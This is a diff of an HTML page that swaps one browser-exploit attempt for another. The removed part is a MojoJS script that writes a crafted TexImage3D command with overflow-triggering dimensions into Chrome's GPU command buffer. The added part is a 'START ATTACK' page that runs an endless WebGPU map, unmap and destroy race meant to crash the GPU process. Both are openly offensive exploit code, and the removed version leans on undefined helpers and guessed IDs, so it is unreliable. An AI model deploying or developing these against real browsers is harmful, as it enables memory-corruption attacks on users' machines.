@@ -1,47 +1,77 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>WebGPU Shared Memory Fuzzer</title>
+    <style>
+        body { font-family: monospace; background: #1e1e1e; color: #00ff00; }
+        #log { white-space: pre-wrap; }
+    </style>
+</head>
 <body>
-    <h1>MojoJS Command Buffer Injector</h1>
-    <script type="module">
-        // Import the pre-compiled bindings you downloaded
-        import { GpuChannel } from './gpu_channel.mojom.js';
-        
-        async function runExploit() {
-            if (typeof Mojo === "undefined") {
-                console.error("MojoJS not enabled!");
+    <h2>WebGPU DOM Fuzzer - Attacking Dawn IPC</h2>
+    <button id="start" style="padding: 10px; font-size: 16px; font-weight: bold; background: #00ff00; color: black; border: none; cursor: pointer;">START ATTACK</button>
+    <div id="log">Waiting to start...</div>
+
+    <script>
+        const logEl = document.getElementById('log');
+        function log(msg) { logEl.innerText += msg + '\n'; }
+
+        async function startFuzzing() {
+            if (!navigator.gpu) {
+                log("WebGPU not supported on this browser! Make sure you are using Chrome.");
                 return;
             }
 
-            console.log("[*] Establishing Mojo GPU Channel...");
-            // The exact setup code depends on the repo you downloaded, but it usually looks like this:
-            let gpu_channel = await setup_gpu_channel(); 
-            let cmd_buffer = await gpu_channel.createCommandBuffer();
-            let shared_mem = cmd_buffer.getSharedMemory();
+            log("Requesting GPU Adapter...");
+            const adapter = await navigator.gpu.requestAdapter();
+            const device = await adapter.requestDevice();
+            log("Device acquired! Starting Shared Memory Race Condition loop...");
 
-            console.log("[*] Crafting Malicious TexImage3D Command...");
-            
-            // This is the 44-byte structure for TexImage3D
-            const CMD_ID_TEXIMAGE3D = 0x00EB; // We may need to brute-force this ID
-            const SIZE_IN_WORDS = 11;
-            
-            let payload = new Uint32Array(shared_mem.buffer);
-            payload[0] = (SIZE_IN_WORDS << 11) | CMD_ID_TEXIMAGE3D; 
-            payload[1] = 0x806F;     // GL_TEXTURE_3D
-            payload[2] = 0;          // level
-            payload[3] = 0x8058;     // GL_RGBA8
-            payload[4] = 0x00010000; // width: 65536 (OVERFLOW TRIGGER)
-            payload[5] = 0x00010000; // height: 65536 (OVERFLOW TRIGGER)
-            payload[6] = 1;          // depth
-            payload[7] = 0x1908;     // format: GL_RGBA
-            payload[8] = 0x1401;     // type: GL_UNSIGNED_BYTE
-            payload[9] = 0;          // shm_id 
-            payload[10] = 100;       // shm_offset 
+            let iteration = 0;
 
-            console.log("[*] Flushing Command Buffer to GPU Process...");
-            cmd_buffer.flush(SIZE_IN_WORDS);
+            // This is the infinite attack loop
+            setInterval(() => {
+                iteration++;
+                if (iteration % 100 === 0) log(`[+] Executed ${iteration} iterations...`);
+
+                try {
+                    // 1. Create a buffer. This sends "DeviceCreateBufferCmd" to the C++ Wire Server
+                    const size = 1024 * 1024; // 1MB
+                    const buffer = device.createBuffer({
+                        size: size,
+                        usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
+                        mappedAtCreation: true // This forces immediate Shared Memory allocation!
+                    });
+
+                    // 2. Get the memory pointer (This triggers GetSharedMemoryAs in C++)
+                    const arrayBuffer = buffer.getMappedRange();
+                    const view = new Uint8Array(arrayBuffer);
+                    
+                    // 3. Write junk into the IPC Shared Memory
+                    view[0] = 0xFF;
+                    view[1] = 0xAA;
+
+                    // 4. THE EXPLOIT ATTEMPT: Race Condition!
+                    // We instantly unmap and destroy the object, while simultaneously 
+                    // asking the GPU process to do something with it.
+                    
+                    // Asynchronously tell the GPU to unmap
+                    buffer.unmap();
+                    
+                    // Instantly tell the C++ side to destroy the Object ID
+                    buffer.destroy();
+
+                    // If the C++ side hasn't finished unmapping before it processes the destroy,
+                    // or if the Garbage Collector cleans up the JS object while C++ is reading,
+                    // the GPU Process will crash!
+
+                } catch (e) {
+                    // We catch normal JS errors so the loop doesn't stop
+                }
+            }, 0); // Run as fast as the browser allows
         }
-        
-        runExploit();
+
+        document.getElementById('start').addEventListener('click', startFuzzing);
     </script>
 </body>
 </html>
